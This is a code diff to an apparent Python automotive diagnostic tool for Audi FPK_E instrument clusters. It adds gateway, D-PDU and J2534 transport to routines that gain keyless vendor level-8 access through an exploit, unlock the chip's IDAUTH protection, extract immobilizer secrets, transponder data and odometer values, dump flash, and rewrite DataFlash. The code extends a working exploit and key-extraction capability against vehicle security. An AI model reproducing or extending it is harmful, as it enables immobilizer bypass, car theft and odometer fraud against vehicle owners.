@@ -7,6 +7,7 @@ from collections.abc import Iterator
 import contextlib
 from datetime import datetime, timezone
 import hashlib
+import inspect
 import json
 from pathlib import Path
 import struct
@@ -741,8 +742,9 @@ class FpkeCanLink:
         log_path: Path | None = None,
         bus: Any | None = None,
         sw_profile: str | None = None,
+        via_gateway: bool = False,
     ) -> None:
-        if bus is None and interface not in FPKE_NATIVE_INTERFACES:
+        if bus is None and not via_gateway and interface not in FPKE_NATIVE_INTERFACES:
             raise RuntimeError(
                 tr(
                     f"Работа с приборной панелью FPK поддерживается только через нативный CAN-адаптер "
@@ -753,6 +755,7 @@ class FpkeCanLink:
             )
         self.port = port
         self.interface = interface
+        self.via_gateway = bool(via_gateway)
         self.sw_profile: str | None = sw_profile.strip().lower() if sw_profile else None
         self._explicit_sw_profile: str | None = self.sw_profile
         self._stack_profile_verified: bool = False
@@ -766,6 +769,7 @@ class FpkeCanLink:
         self._history: list[tuple[float, str, int, bool, bytes]] = []
         self._rx_trace_suspended = 0
         self._log_file = None
+        self._borrowed: Any = None
         self._keepalive_stop: threading.Event | None = None
         self._keepalive_thread: threading.Thread | None = None
         self._keepalive_started_at: float | None = None
@@ -782,6 +786,17 @@ class FpkeCanLink:
         if bus is not None:
             self.bus = bus
             self._owns_bus = False
+        elif interface == "dpdu":
+            from contitool.can import dpdu
+
+            self._borrowed = dpdu.open_session(port or "", bitrate)
+            self.bus = self._borrowed
+            self._owns_bus = False
+        elif interface == "j2534":
+            from contitool.can.j2534 import J2534Bus
+
+            self.bus = J2534Bus(port, bitrate)
+            self._owns_bus = True
         else:
             kwargs: dict[str, Any] = {
                 "interface": interface,
@@ -820,6 +835,11 @@ class FpkeCanLink:
             with contextlib.suppress(Exception):
                 self.bus.shutdown()
             self._owns_bus = False
+        if getattr(self, "_borrowed", None) is not None:
+            from contitool.can import dpdu
+
+            dpdu.release_session(self._borrowed)
+            self._borrowed = None
         if self._log_file is not None:
             with contextlib.suppress(Exception):
                 self._log_file.close()
@@ -892,7 +912,7 @@ class FpkeCanLink:
         return self._keepalive_thread is not None and self._keepalive_thread.is_alive()
 
     def start_keepalive(self) -> None:
-        if self.is_keepalive_running():
+        if self.via_gateway or self.is_keepalive_running():
             return
         stop = threading.Event()
         self._keepalive_stop = stop
@@ -1334,8 +1354,9 @@ def open_or_reuse_fpke_link(
     interface: str = "slcan",
     log_path: Path | None = None,
     bus: Any | None = None,
+    via_gateway: bool = False,
 ) -> FpkeCanLink:
-    """Reuse the open `FpkeCanLink` for `(port, interface)` if available, or open a new persistent link."""
+    """Reuse the open `FpkeCanLink` for `(port, interface, via_gateway)` if available, or open a new persistent link."""
     global _ACTIVE_LINK
     with _ACTIVE_LINK_LOCK:
         cur = _ACTIVE_LINK
@@ -1344,6 +1365,7 @@ def open_or_reuse_fpke_link(
             and not cur.is_closed
             and cur.port == port
             and cur.interface == interface
+            and cur.via_gateway == bool(via_gateway)
             and (bus is None or cur.bus is bus)
         ):
             if log_path is not None:
@@ -1352,7 +1374,7 @@ def open_or_reuse_fpke_link(
         _ACTIVE_LINK = None
     if cur is not None and not cur.is_closed:
         cur.close()
-    new_link = FpkeCanLink(port, interface=interface, log_path=log_path, bus=bus)
+    new_link = FpkeCanLink(port, interface=interface, log_path=log_path, bus=bus, via_gateway=via_gateway)
     with _ACTIVE_LINK_LOCK:
         _ACTIVE_LINK = new_link
     return new_link
@@ -1366,21 +1388,169 @@ def _managed_fpke_link(
     log_path: Path | None = None,
     bus: Any | None = None,
     keep_open: bool = False,
+    via_gateway: bool = False,
 ) -> Iterator[FpkeCanLink]:
     """Yield an `FpkeCanLink`, keeping it open on exit when `keep_open=True` or when reusing an active session."""
-    reused = get_active_fpke_link(port, interface) is not None and (
-        bus is None or getattr(get_active_fpke_link(port, interface), "bus", None) is bus
+    active = get_active_fpke_link(port, interface)
+    reused = (
+        active is not None
+        and active.via_gateway == bool(via_gateway)
+        and (bus is None or getattr(active, "bus", None) is bus)
     )
     if keep_open or reused:
-        link = open_or_reuse_fpke_link(port, interface=interface, log_path=log_path, bus=bus)
+        link = open_or_reuse_fpke_link(port, interface=interface, log_path=log_path, bus=bus, via_gateway=via_gateway)
         try:
             yield link
         finally:
             if not keep_open and not reused:
                 close_active_fpke_link()
     else:
-        with FpkeCanLink(port, interface=interface, log_path=log_path, bus=bus) as link:
+        with FpkeCanLink(port, interface=interface, log_path=log_path, bus=bus, via_gateway=via_gateway) as link:
             yield link
+
+
+@contextlib.contextmanager
+def _managed_fpke_session(
+    port: str,
+    *,
+    interface: str = "slcan",
+    log_path: Path | None = None,
+    bus: Any | None = None,
+    keep_open: bool = False,
+    via_gateway: bool = False,
+    gateway_bridge: bool = False,
+    gateway_channel: int = 0,
+    needs_level8: bool = True,
+    reporter: OperationReporter = NULL_REPORTER,
+) -> Iterator[tuple[FpkeCanLink, bool]]:
+    """Open an FPK_E CAN session over either direct CAN or a J533 gateway (with automatic Level-2 RAM-Bridge).
+
+    Yields `(link, bridged)`:
+      - `via_gateway=False`: behaves identically to `_managed_fpke_link` (`bridged=False`).
+      - `via_gateway=True, needs_level8=False`: pure UDS `0x714/0x77E` through the gateway (`bridged=False`).
+      - `via_gateway=True, needs_level8=True`: first checks if vendor level 8 is already open over normal UDS
+        through the gateway; if so, runs directly over UDS without disrupting the gateway (`bridged=False`).
+        Otherwise, enters `J533CanBridge` (`ch3 Diag CAN ↔ ch{gateway_channel}`) so 29-bit `0x1BFCA2xx`/`0x17FA0E14`
+        pass transparently, runs the operation, and resets J533 cleanly back to Application on exit (`bridged=True`).
+    """
+    if not via_gateway:
+        with _managed_fpke_link(
+            port,
+            interface=interface,
+            log_path=log_path,
+            bus=bus,
+            keep_open=keep_open,
+            via_gateway=False,
+        ) as link:
+            yield link, False
+        return
+
+    if not needs_level8:
+        with _managed_fpke_link(
+            port,
+            interface=interface,
+            log_path=log_path,
+            bus=bus,
+            keep_open=keep_open,
+            via_gateway=True,
+        ) as link:
+            yield link, False
+        return
+
+    # Probe whether vendor level 8 is already active over normal J533 UDS before disrupting the gateway
+    close_active_fpke_link()
+    probe = FpkeCanLink(port, interface=interface, log_path=log_path, bus=bus, via_gateway=True)
+    already_l8 = False
+    try:
+        already_l8 = fpke_check_level8(probe, timeout=0.6) is not None
+    except Exception:
+        already_l8 = False
+    if already_l8:
+        reporter.info(
+            tr(
+                "Уровень доступа 8 уже открыт — работаем напрямую по UDS через шлюз J533 без запуска моста.",
+                "Vendor level 8 is already active — running directly over J533 UDS without starting the bridge.",
+            )
+        )
+        try:
+            yield probe, False
+        finally:
+            probe.close()
+        return
+
+    probe.close()
+    if not gateway_bridge:
+        raise RuntimeError(
+            tr(
+                "Для доступа уровня 8 к памяти панели приборов FPK_E через шлюз требуется шлюз "
+                "Continental 3Q0 907 530 и нативный CAN-адаптер (CANable / SLCAN / candleLight) для запуска "
+                "прозрачного RAM-моста — либо прямое подключение к CAN панели приборов (T18).",
+                "Keyless level-8 access to an FPK_E instrument cluster through a gateway requires a Continental "
+                "3Q0 907 530 gateway and a native CAN adapter (CANable / SLCAN / candleLight) for the transparent "
+                "RAM bridge — or a direct connection to the cluster CAN bus (T18).",
+            )
+        )
+
+    from contitool.can.bridge import j533_can_bridge
+
+    with j533_can_bridge(
+        port,
+        interface=interface,
+        target_channel=gateway_channel,
+        log_path=log_path,
+        bus=bus,
+        reporter=reporter,
+    ) as bridge:
+        with FpkeCanLink(
+            port,
+            interface=interface,
+            log_path=log_path,
+            bus=bridge.bus,
+            via_gateway=False,
+        ) as br_link:
+            yield br_link, True
+
+
+def can_fpke_run_level8_action(
+    port: str,
+    action: Any,
+    *,
+    interface: str = "slcan",
+    via_gateway: bool = False,
+    gateway_bridge: bool = False,
+    gateway_channel: int = 0,
+    keep_open: bool = True,
+    bus: Any | None = None,
+    reporter: OperationReporter = NULL_REPORTER,
+) -> Any:
+    """Run an FPK_E callback `action(link)` or `action(link, reporter)` that requires vendor level 8."""
+    accepts_reporter = False
+    try:
+        sig = inspect.signature(action)
+        pos_params = [
+            p
+            for p in sig.parameters.values()
+            if p.kind in (inspect.Parameter.POSITIONAL_ONLY, inspect.Parameter.POSITIONAL_OR_KEYWORD)
+        ]
+        has_varargs = any(p.kind == inspect.Parameter.VAR_POSITIONAL for p in sig.parameters.values())
+        accepts_reporter = has_varargs or len(pos_params) >= 2
+    except (TypeError, ValueError):
+        accepts_reporter = False
+
+    with _managed_fpke_session(
+        port,
+        interface=interface,
+        bus=bus,
+        keep_open=keep_open and not via_gateway,
+        via_gateway=via_gateway,
+        gateway_bridge=gateway_bridge,
+        gateway_channel=gateway_channel,
+        needs_level8=True,
+        reporter=reporter,
+    ) as (link, _bridged):
+        if accepts_reporter:
+            return action(link, reporter)
+        return action(link)
 
 
 # ────────────────────────────── Protocol Primitives (Level 8, FD11, 0x23, 0x3D) ──────────────────────────────
@@ -1575,7 +1745,7 @@ def fpke_establish_level8(
     if wake_seconds > 0:
         reporter.can_log(
             tr(
-                f"Имитация сети CAN (3C0/663/585/3BE) и пробуждение приборки ({wake_seconds:.1f} с)…",
+                f"Имитация сети CAN (3C0/663/585/3BE) и пробуждение панели приборов ({wake_seconds:.1f} с)…",
                 f"Starting CAN network keepalive (3C0/663/585/3BE) and waking cluster ({wake_seconds:.1f} s)…",
             )
         )
@@ -1625,14 +1795,14 @@ def fpke_establish_level8(
         if raw[:2] == b"\x14\xef":
             raise RuntimeError(
                 tr(
-                    f"Приборка отклонила EC arming на 0x1BFCA2EE ({raw.hex(' ').upper()}).",
+                    f"Панель приборов отклонила EC arming на 0x1BFCA2EE ({raw.hex(' ').upper()}).",
                     f"Cluster rejected EC arming on 0x1BFCA2EE ({raw.hex(' ').upper()}).",
                 )
             )
     if not armed:
         raise RuntimeError(
             tr(
-                "Не получен ответ готовности EC arming (0x1BFCA2EE = 14 02). Проверьте питание приборки и шину CAN.",
+                "Не получен ответ готовности EC arming (0x1BFCA2EE = 14 02). Проверьте питание панели приборов и шину CAN.",
                 "EC arming readiness (0x1BFCA2EE = 14 02) was not received. Check cluster power and CAN bus.",
             )
         )
@@ -2102,7 +2272,7 @@ def _read_verified_extra_area(
                 break
             reporter.can_log(
                 tr(
-                    f"Фоновое обращение приборки к DataFlash (EEL) во время чтения Extra Area — повтор ({attempt}/{attempts - 1})…",
+                    f"Фоновое обращение панели приборов к DataFlash (EEL) во время чтения Extra Area — повтор ({attempt}/{attempts - 1})…",
                     f"Cluster background DataFlash (EEL) activity during Extra Area read — retrying ({attempt}/{attempts - 1})…",
                 )
             )
@@ -2176,12 +2346,16 @@ def can_fpke_full_read(
     cflash_bytes: bytes | None = None,
     ident: list[dict[str, str]] | None = None,
     keep_open: bool = False,
+    via_gateway: bool = False,
+    gateway_bridge: bool = False,
+    gateway_channel: int = 0,
     bus: Any | None = None,
     reporter: OperationReporter = NULL_REPORTER,
 ) -> dict[str, Any]:
     """Complete single-session keyless read of Audi FPK_E SW 83A:
 
-    1. Checks if vendor level 8 is already active on the open link; if not, establishes vendor level 8.
+    1. Checks if vendor level 8 is already active on the open link; if not, establishes vendor level 8
+       (automatically engaging the J533 transparent CAN RAM-bridge when `via_gateway=True` & `gateway_bridge=True`).
     2. Reads 256-byte Extra Area (`0xFF300000`) via `bflash` applet and validates security/OPBT0 words.
     3. Extracts candidate 16-byte `IDCODE` (`0xFF300050`), verifies it via hardware `IDAUTH` (`IDST 01 -> 00`),
        re-reads Extra Area with `IDAUTH` unlocked, and relocks `IDAUTH` with zeroes (`00 -> 01`).
@@ -2189,7 +2363,7 @@ def can_fpke_full_read(
        (`FD11`, `K_c`, `IKA/CP`, `S0/S1`, transponders, coding, odometer).
     5. Optionally reads `UFlash` (32 KiB), `BFlash` (96 KiB), and/or `CFlash` (2 MiB) in the same session.
     6. Atomically writes `Dflash.bin`, `ExtraArea.bin`, `fpke_report.json`, and `fpke.can.log`.
-       When `keep_open=True`, leaves the CAN connection and KL15 keepalive running for subsequent reads/procedures.
+       When `keep_open=True` (direct CAN), leaves the CAN connection and KL15 keepalive running for subsequent reads/procedures.
     """
     from contitool.can.workflows import default_session_dir
 
@@ -2206,7 +2380,20 @@ def can_fpke_full_read(
     step_no = 1
     started = time.monotonic()
 
-    with _managed_fpke_link(port, interface=interface, log_path=out_dir / "can.jsonl", bus=bus, keep_open=keep_open) as link:
+    with _managed_fpke_session(
+        port,
+        interface=interface,
+        log_path=out_dir / "can.jsonl",
+        bus=bus,
+        keep_open=keep_open and not via_gateway,
+        via_gateway=via_gateway,
+        gateway_bridge=gateway_bridge,
+        gateway_channel=gateway_channel,
+        needs_level8=True,
+        reporter=reporter,
+    ) as (link, bridged):
+        eff_stream = use_stream and (not via_gateway or bridged)
+        eff_wake = min(wake_seconds, 1.5) if bridged else wake_seconds
         try:
             if ident and getattr(link, "sw_profile", None) is None:
                 link.sw_profile = fpke_detect_sw_profile(ident)
@@ -2218,7 +2405,7 @@ def can_fpke_full_read(
             exploit_info = fpke_ensure_level8(
                 link,
                 frame_delay=frame_delay,
-                wake_seconds=wake_seconds,
+                wake_seconds=eff_wake,
                 reporter=reporter,
             )
 
@@ -2279,7 +2466,7 @@ def can_fpke_full_read(
             dflash_bytes, dflash_read_meta = _read_verified_dflash(
                 link,
                 chunk_size=dflash_chunk,
-                use_stream=use_stream,
+                use_stream=eff_stream,
                 label="DataFlash",
                 reporter=reporter,
             )
@@ -2294,7 +2481,7 @@ def can_fpke_full_read(
                     mode="uflash",
                     source=FPKE_UFLASH_ADDR,
                     length=FPKE_UFLASH_SIZE,
-                    use_stream=use_stream,
+                    use_stream=eff_stream,
                     label="Uflash",
                     reporter=reporter,
                 )
@@ -2311,7 +2498,7 @@ def can_fpke_full_read(
                     mode="bflash",
                     source=FPKE_BFLASH_ADDR,
                     length=FPKE_BFLASH_SIZE,
-                    use_stream=use_stream,
+                    use_stream=eff_stream,
                     label="Bflash",
                     reporter=reporter,
                 )
@@ -2329,7 +2516,7 @@ def can_fpke_full_read(
                     source=FPKE_CFLASH_ADDR,
                     length=FPKE_CFLASH_SIZE,
                     chunk_size=500,
-                    use_stream=use_stream,
+                    use_stream=eff_stream,
                     label="CodeFlash",
                     reporter=reporter,
                 )
@@ -2359,6 +2546,8 @@ def can_fpke_full_read(
                 "timestamp_utc": datetime.now(timezone.utc).isoformat(),
                 "port": port,
                 "interface": interface,
+                "via_gateway": bool(via_gateway),
+                "gateway_bridged": bool(bridged),
                 "frame_delay_s": frame_delay,
                 "can_only": True,
                 "target_keys_used": False,
@@ -2415,6 +2604,9 @@ def can_fpke_read_region(
     output_path: Path | None = None,
     session_dir: Path | None = None,
     keep_open: bool = False,
+    via_gateway: bool = False,
+    gateway_bridge: bool = False,
+    gateway_channel: int = 0,
     bus: Any | None = None,
     reporter: OperationReporter = NULL_REPORTER,
 ) -> dict[str, Any]:
@@ -2454,24 +2646,37 @@ def can_fpke_read_region(
         raise ValueError("--idcode must contain exactly 16 bytes (32 hex chars)")
 
     started = time.monotonic()
-    with _managed_fpke_link(port, interface=interface, log_path=out_dir / "can.jsonl", bus=bus, keep_open=keep_open) as link:
+    with _managed_fpke_session(
+        port,
+        interface=interface,
+        log_path=out_dir / "can.jsonl",
+        bus=bus,
+        keep_open=keep_open and not via_gateway,
+        via_gateway=via_gateway,
+        gateway_bridge=gateway_bridge,
+        gateway_channel=gateway_channel,
+        needs_level8=(mode != "known-key"),
+        reporter=reporter,
+    ) as (link, bridged):
+        eff_stream = use_stream and mode != "known-key" and (not via_gateway or bridged)
+        eff_wake = min(wake_seconds, 1.5) if bridged else wake_seconds
         try:
             if mode == "known-key":
                 if not fd11_key_hex:
                     raise ValueError("--fd11-key (16-byte hex) is required for known-key mode")
                 key_bytes = bytes.fromhex(fd11_key_hex)
                 link.start_keepalive()
-                if wake_seconds > 0:
-                    time.sleep(wake_seconds)
-                reporter.step(1, 2, tr("Штатная авторизация FD11 (без эксплойта)", "Standard FD11 authentication (no exploit)"))
+                if eff_wake > 0 and not via_gateway:
+                    time.sleep(eff_wake)
+                reporter.step(1, 2, tr("Штатная авторизация FD11", "Standard FD11 authentication"))
                 fd11_id = fpke_authenticate_fd11(link, key_bytes, reporter=reporter)
-                exploit_info: dict[str, Any] = {"exploit": False, "vendor_level": 6, "fd11_identifier": fd11_id}
+                access_info: dict[str, Any] = {"exploit": False, "vendor_level": 6, "fd11_identifier": fd11_id}
             else:
                 reporter.step(1, 2, tr("Проверка доступа уровня 8 по CAN", "Checking level 8 CAN access"))
-                exploit_info = fpke_ensure_level8(
+                access_info = fpke_ensure_level8(
                     link,
                     frame_delay=frame_delay,
-                    wake_seconds=wake_seconds,
+                    wake_seconds=eff_wake,
                     reporter=reporter,
                 )
 
@@ -2496,7 +2701,7 @@ def can_fpke_read_region(
                     data, read_meta = _read_verified_dflash(
                         link,
                         chunk_size=chunk_size,
-                        use_stream=use_stream and mode != "known-key",
+                        use_stream=eff_stream,
                         label=mode.upper(),
                         reporter=reporter,
                     )
@@ -2507,7 +2712,7 @@ def can_fpke_read_region(
                         source=eff_source,
                         length=eff_length,
                         chunk_size=chunk_size,
-                        use_stream=use_stream and mode != "known-key",
+                        use_stream=eff_stream,
                         label=mode.upper(),
                         reporter=reporter,
                     )
@@ -2527,11 +2732,13 @@ def can_fpke_read_region(
                 "timestamp_utc": datetime.now(timezone.utc).isoformat(),
                 "port": port,
                 "interface": interface,
+                "via_gateway": bool(via_gateway),
+                "gateway_bridged": bool(bridged),
                 "mode": mode,
                 "can_only": True,
                 "target_keys_used": mode == "known-key",
                 "flash_writes": False,
-                "access": exploit_info,
+                "access": access_info,
                 "read": read_meta,
                 "idauth": idauth_meta,
                 "wall_s": round(time.monotonic() - started, 3),
@@ -2975,7 +3182,7 @@ def fpke_extract_live_s0_s1_from_coil(
 
     raise RuntimeError(
         tr(
-            f"Слоты A/B ещё не загружены в ОЗУ приборки (флаг слотов={last_slots_flag}, состояние={last_recog_state}). "
+            f"Слоты A/B ещё не загружены в ОЗУ панели приборов (флаг слотов={last_slots_flag}, состояние={last_recog_state}). "
             "Приложите рабочий ключ (Ключ 1) к штатной катушке при включённом зажигании, подождите 1–2 с и повторите.",
             f"Slots A/B are not loaded in cluster RAM yet (slots_flag={last_slots_flag}, recog_state={last_recog_state}). "
             "Hold a working key (Key 1) against the stock LF coil with ignition ON, wait 1–2 s, and retry.",
@@ -3680,6 +3887,9 @@ def can_fpke_write_dflash(
     allow_foreign: bool = False,
     reset_after: bool = True,
     keep_open: bool = True,
+    via_gateway: bool = False,
+    gateway_bridge: bool = False,
+    gateway_channel: int = 0,
     bus: Any | None = None,
     reporter: OperationReporter = NULL_REPORTER,
 ) -> dict[str, Any]:
@@ -3725,15 +3935,27 @@ def can_fpke_write_dflash(
     total_steps = 6 if reset_after else 5
     started = time.monotonic()
 
-    with _managed_fpke_link(port, interface=interface, log_path=out_dir / "can.jsonl", bus=bus, keep_open=keep_open) as link:
+    with _managed_fpke_session(
+        port,
+        interface=interface,
+        log_path=out_dir / "can.jsonl",
+        bus=bus,
+        keep_open=keep_open and not via_gateway,
+        via_gateway=via_gateway,
+        gateway_bridge=gateway_bridge,
+        gateway_channel=gateway_channel,
+        needs_level8=True,
+        reporter=reporter,
+    ) as (link, bridged):
+        eff_wake = min(wake_seconds, 1.5) if bridged else wake_seconds
         idauth_unlocked = False
         try:
             # Step 1: Level 8 access
             reporter.step(1, total_steps, tr("Проверка доступа уровня 8 по CAN", "Checking level 8 CAN access"))
-            exploit_info = fpke_ensure_level8(
+            access_info = fpke_ensure_level8(
                 link,
                 frame_delay=frame_delay,
-                wake_seconds=wake_seconds,
+                wake_seconds=eff_wake,
                 reporter=reporter,
             )
 
@@ -3984,11 +4206,11 @@ def can_fpke_write_dflash(
                     6,
                     total_steps,
                     tr(
-                        "Аппаратный перезапуск приборки (SWRESA) и проверка данных в ОЗУ",
+                        "Аппаратный перезапуск панели приборов (SWRESA) и проверка данных в ОЗУ",
                         "Hardware cluster reset (SWRESA) & live RAM verification",
                     ),
                 )
-                reset_info = fpke_trigger_swresa_reset(link, wake_seconds=wake_seconds, reporter=reporter)
+                reset_info = fpke_trigger_swresa_reset(link, wake_seconds=eff_wake, reporter=reporter)
 
             prof = _resolve_link_profile(link)
             readback_secrets = analyze_fpke_dflash(dflash_readback, cflash_bytes)
@@ -4000,6 +4222,8 @@ def can_fpke_write_dflash(
                 "timestamp_utc": datetime.now(timezone.utc).isoformat(),
                 "port": port,
                 "interface": interface,
+                "via_gateway": bool(via_gateway),
+                "gateway_bridged": bool(bridged),
                 "mode": write_mode,
                 "elapsed_s": elapsed_s,
                 "blocks_written": write_stats["blocks_written"],
@@ -4016,7 +4240,7 @@ def can_fpke_write_dflash(
                 "dflash_path": str(dflash_path),
                 "extra_path": str(extra_path),
                 "session_dir": str(out_dir),
-                "exploit": exploit_info,
+                "exploit": access_info,
                 "idauth": {
                     "candidate_idcode": candidate_idcode.hex(),
                     "accepted": True,
